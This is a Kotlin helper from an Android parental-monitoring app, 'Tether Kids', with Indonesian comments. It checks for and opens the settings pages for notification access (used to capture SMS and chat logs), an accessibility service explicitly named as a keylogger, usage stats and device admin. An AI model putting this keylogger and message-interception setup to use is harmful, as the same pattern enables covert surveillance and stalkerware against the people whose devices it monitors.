package com.tether.kids.security

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.widget.Toast

/**
 * PermissionPrompter — Helper untuk auto-prompt special permissions
 * yang tidak bisa di-request via standard Android permission API.
 *
 * Special permissions yang perlu manual enable:
 *  1. Notification Access (untuk SMS logs) — Settings > Special Access
 *  2. Accessibility Service (untuk Keylogger) — Settings > Accessibility
 *  3. Usage Stats (untuk App Usage) — Settings > Special Access
 *  4. Device Admin (untuk Lock Screen) — Settings > Security
 *
 * Method ini buka Settings ke halaman yang tepat, user tinggal tap ON.
 * Setelah user enable, kirim balik ke Tether Kids via broadcast atau polling.
 */
object PermissionPrompter {
    private const val TAG = "PermPrompt"

    /**
     * Cek apakah Notification Access sudah enabled untuk Tether Kids.
     */
    fun isNotificationAccessEnabled(context: Context): Boolean {
        val pkg = android.service.notification.NotificationListenerService::class.java
        val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(context.packageName)
    }

    /**
     * Buka Settings > Notification Access.
     */
    fun openNotificationAccessSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            Toast.makeText(context, "Cari 'Tether Kids' di list, lalu aktifkan", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open notification access settings: ${e.message}")
        }
    }

    /**
     * Cek apakah Usage Stats permission sudah enabled.
     */
    fun isUsageStatsEnabled(context: Context): Boolean {
        return try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.packageName
            )
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Buka Settings > Usage Access.
     */
    fun openUsageStatsSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            Toast.makeText(context, "Cari 'Tether Kids' di list, lalu aktifkan", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open usage stats settings: ${e.message}")
        }
    }

    /**
     * Cek apakah Accessibility Service sudah enabled.
     */
    fun isAccessibilityEnabled(context: Context): Boolean {
        val expected = context.packageName + "/" + com.tether.kids.service.KeyloggerService::class.java.name
        val enabled = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabled)
        while (splitter.hasNext()) {
            if (splitter.next().equals(expected, ignoreCase = true)) return true
        }
        return false
    }

    /**
     * Buka Settings > Accessibility.
     */
    fun openAccessibilitySettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            Toast.makeText(context, "Cari 'Tether Kids' di Accessibility, lalu aktifkan", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open accessibility settings: ${e.message}")
        }
    }

    /**
     * Cek Device Admin active.
     */
    fun isDeviceAdminActive(context: Context): Boolean {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val comp = ComponentName(context, com.tether.kids.service.DeviceAdminReceiver::class.java)
            dpm.isAdminActive(comp)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Request Device Admin activation.
     */
    fun requestDeviceAdmin(context: Context) {
        try {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(context, com.tether.kids.service.DeviceAdminReceiver::class.java)
            )
            intent.putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Tether Kids butuh Device Admin supaya orang tua bisa lock screen dari jauh."
            )
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request device admin: ${e.message}")
        }
    }

    /**
     * Cek SEMUA special permissions dan return report.
     */
    data class PermissionStatus(
        val notificationAccess: Boolean,
        val accessibility: Boolean,
        val usageStats: Boolean,
        val deviceAdmin: Boolean
    )

    fun checkAll(context: Context): PermissionStatus {
        return PermissionStatus(
            notificationAccess = isNotificationAccessEnabled(context),
            accessibility = isAccessibilityEnabled(context),
            usageStats = isUsageStatsEnabled(context),
            deviceAdmin = isDeviceAdminActive(context)
        )
    }

    /**
     * Show dialog dengan status semua special permission,
     * dengan tombol "Enable" masing-masing.
     */
    fun showSetupDialog(activity: Activity) {
        val status = checkAll(activity)
        val message = buildString {
            appendLine("Special permissions yang diperlukan:")
            appendLine()
            appendLine("📬 Notification Access: ${if (status.notificationAccess) "✅ ON" else "❌ OFF"}")
            appendLine("   (untuk SMS/chat logs)")
            appendLine()
            appendLine("♿ Accessibility: ${if (status.accessibility) "✅ ON" else "❌ OFF"}")
            appendLine("   (untuk keylogger)")
            appendLine()
            appendLine("📊 Usage Stats: ${if (status.usageStats) "✅ ON" else "❌ OFF"}")
            appendLine("   (untuk app usage monitor)")
            appendLine()
            appendLine("🛡️ Device Admin: ${if (status.deviceAdmin) "✅ ON" else "❌ OFF"}")
            appendLine("   (untuk lock screen)")
        }
        androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("🔐 Setup Permissions")
            .setMessage(message)
            .setPositiveButton("Setup") { _, _ ->
                // Open first unset permission
                if (!status.notificationAccess) openNotificationAccessSettings(activity)
                else if (!status.accessibility) openAccessibilitySettings(activity)
                else if (!status.usageStats) openUsageStatsSettings(activity)
                else if (!status.deviceAdmin) requestDeviceAdmin(activity)
            }
            .setNeutralButton("Skip") { _, _ -> }
            .show()
    }
}
